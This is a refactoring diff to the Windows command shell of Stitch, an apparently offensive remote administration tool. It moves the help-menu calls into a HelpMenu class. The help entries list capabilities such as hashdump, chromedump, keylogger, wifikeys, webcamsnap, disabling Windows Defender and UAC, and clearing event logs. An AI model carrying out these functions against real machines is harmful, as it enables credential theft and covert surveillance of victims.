@@ -3,11 +3,14 @@
 # Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.
 
 import stitch_lib
-from stitch_help import *
+from stitch_help import HelpMenu
 from stitch_utils import *
 
 
 class st_winshell(cmd.Cmd):
+
+    _help = HelpMenu()
+
     def begin_session(self, target=None, port=80, socket=None, aes_key=None):
         cmd.Cmd.__init__(self)
         self.alive = True
@@ -282,166 +285,166 @@ class st_winshell(cmd.Cmd):
     ################################################################################
 
     def help_askpassword(self):
-        st_help_askpassword()
+        self._help.st_help_askpassword()
 
     def help_avscan(self):
-        st_help_avscan()
+        self._help.st_help_avscan()
 
     def help_avkill(self):
-        st_help_avkill()
+        self._help.st_help_avkill()
 
     def help_cat(self):
-        st_help_cat()
+        self._help.st_help_cat()
 
     def help_cd(self):
-        st_help_cd()
+        self._help.st_help_cd()
 
     def help_chromedump(self):
-        st_help_chromedump()
+        self._help.st_help_chromedump()
 
     def help_cls(self):
-        st_help_cls()
+        self._help.st_help_cls()
 
     def help_clear(self):
-        st_help_clear()
+        self._help.st_help_clear()
 
     def help_clearev(self):
-        st_help_clearev()
+        self._help.st_help_clearev()
 
     def help_dir(self):
-        st_help_dir()
+        self._help.st_help_dir()
 
     def help_disableRDP(self):
-        st_help_disableRDP()
+        self._help.st_help_disableRDP()
 
     def help_disableUAC(self):
-        st_help_disableUAC()
+        self._help.st_help_disableUAC()
 
     def help_disableWindef(self):
-        st_help_disableWindef()
+        self._help.st_help_disableWindef()
 
     def help_displayoff(self):
-        st_help_displayoff()
+        self._help.st_help_displayoff()
 
     def help_displayon(self):
-        st_help_displayon()
+        self._help.st_help_displayon()
 
     def help_download(self):
-        st_help_download()
+        self._help.st_help_download()
 
     def help_drives(self):
-        st_help_drives()
+        self._help.st_help_drives()
 
     def help_editaccessed(self):
-        st_help_editaccessed()
+        self._help.st_help_editaccessed()
 
     def help_editcreated(self):
-        st_help_editcreated()
+        self._help.st_help_editcreated()
 
     def help_editmodified(self):
-        st_help_editmodified()
+        self._help.st_help_editmodified()
 
     def help_enableRDP(self):
-        st_help_enableRDP()
+        self._help.st_help_enableRDP()
 
     def help_enableUAC(self):
-        st_help_enableUAC()
+        self._help.st_help_enableUAC()
 
     def help_enableWindef(self):
-        st_help_enableWindef()
+        self._help.st_help_enableWindef()
 
     def help_environment(self):
-        st_help_environment()
+        self._help.st_help_environment()
 
     def help_fileinfo(self):
-        st_help_fileinfo()
+        self._help.st_help_fileinfo()
 
     def help_firewall(self):
-        st_help_firewall()
+        self._help.st_help_firewall()
 
     def help_freeze(self):
-        st_help_freeze()
+        self._help.st_help_freeze()
 
     def help_hashdump(self):
-        st_help_hashdump()
+        self._help.st_help_hashdump()
 
     def help_hide(self):
-        st_help_hide()
+        self._help.st_help_hide()
 
     def help_hostsfile(self):
-        st_help_hostsfile()
+        self._help.st_help_hostsfile()
 
     def help_ifconfig(self):
-        st_help_ifconfig()
+        self._help.st_help_ifconfig()
 
     def help_keylogger(self):
-        st_help_keylogger()
+        self._help.st_help_keylogger()
 
     def help_ls(self):
-        st_help_ls()
+        self._help.st_help_ls()
 
     def help_lsmod(self):
-        st_help_lsmod()
+        self._help.st_help_lsmod()
 
     def help_location(self):
-        st_help_location()
+        self._help.st_help_location()
 
     def help_lockscreen(self):
-        st_help_lockscreen()
+        self._help.st_help_lockscreen()
 
     def help_more(self):
-        st_help_more()
+        self._help.st_help_more()
 
     def help_popup(self):
-        st_help_popup()
+        self._help.st_help_popup()
 
     def help_pwd(self):
-        st_help_pwd()
+        self._help.st_help_pwd()
 
     def help_ps(self):
-        st_help_ps()
+        self._help.st_help_ps()
 
     def help_pyexec(self):
-        st_help_pyexec()
+        self._help.st_help_pyexec()
 
     def help_scanreg(self):
-        st_help_scanreg()
+        self._help.st_help_scanreg()
 
     def help_screenshot(self):
-        st_help_screenshot()
+        self._help.st_help_screenshot()
 
     def help_sysinfo(self):
-        st_help_sysinfo()
+        self._help.st_help_sysinfo()
 
     def help_touch(self):
-        st_help_touch()
+        self._help.st_help_touch()
 
     def help_unhide(self):
-        st_help_unhide()
+        self._help.st_help_unhide()
 
     def help_upload(self):
-        st_help_upload()
+        self._help.st_help_upload()
 
     def help_vmscan(self):
-        st_help_vmscan()
+        self._help.st_help_vmscan()
 
     def help_webcamsnap(self):
-        st_help_webcamsnap()
+        self._help.st_help_webcamsnap()
 
     def help_webcamlist(self):
-        st_help_webcamlist()
+        self._help.st_help_webcamlist()
 
     def help_wifikeys(self):
-        st_help_wifikeys()
+        self._help.st_help_wifikeys()
 
     def help_exit(self):
-        st_help_exit()
+        self._help.st_help_exit()
 
     def help_EOF(self):
-        st_help_EOF()
+        self._help.st_help_EOF()
 
 
-def start_shell(t, p, c, a):
-    shell = st_winshell()
-    shell.begin_session(target=t, port=p, socket=c, aes_key=a)
-    shell.cmdloop()
+def start_win_shell(t, p, c, a):
+    win_shell = st_winshell()
+    win_shell.begin_session(target=t, port=p, socket=c, aes_key=a)
+    win_shell.cmdloop()
